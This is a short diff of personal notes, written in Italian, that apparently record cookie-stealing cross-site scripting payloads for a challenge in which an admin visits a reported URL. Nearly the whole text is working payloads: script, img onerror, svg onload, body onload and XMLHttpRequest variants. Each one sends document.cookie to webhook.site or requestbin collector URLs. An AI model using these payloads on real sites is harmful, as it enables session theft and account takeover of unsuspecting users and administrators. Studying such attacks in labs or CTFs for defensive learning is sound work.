@@ -1,3 +1,16 @@
 per rubare il cookie: (concateno con il + nella query string sennò non prende document.cookie ma prende una stringa)
 <script>fetch('https://webhook.site/1e26f300-a6a6-4354-b21d-f7bae298c1ca?cookie=' + document.cookie)</script>
 per fare in mdoo che l'admin mi invii il suo reporto l'url aa cui mi porta quello script facendo in modo che mi invii il suo di cookie
+
+Altro metodo: mettere come attributo dell'immagine come onerror del codice che ti invii il cookie (stessa cosa di prima lo reporto all'admin e lui mi invia quindi il suo)
+<img src="x" onerror="fetch('https://entpzgrl.requestbin.com/?cookie=' + document.cookie)">
+"" onerror="fetch('https://webhook.site/1e26f300-a6a6-4354-b21d-f7bae298c1ca/?cookie=' + document.cookie)">
+
+Posso usare anche un tag svg in cui inserire lo script
+<svg onload="fetch('https://webhook.site/1e26f300-a6a6-4354-b21d-f7bae298c1ca/?cookie=' + document.cookie)"></svg>
+
+<body onload="fetch('https://webhook.site/0d679ff2-8e95-4324-9e85-c667506d54da/?cookie=' + document.cookie)"></body>
+<body onload="fetch('https://webhook.site/0d679ff2-8e95-4324-9e85-c667506d54da/?cookie=' + encodeURIComponent(document.cookie))"></body>
+
+<body onload="var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://webhook.site/0d679ff2-8e95-4324-9e85-c667506d54da/?cookie=' + encodeURIComponent(document.cookie)); xhr.send();"></body>
+
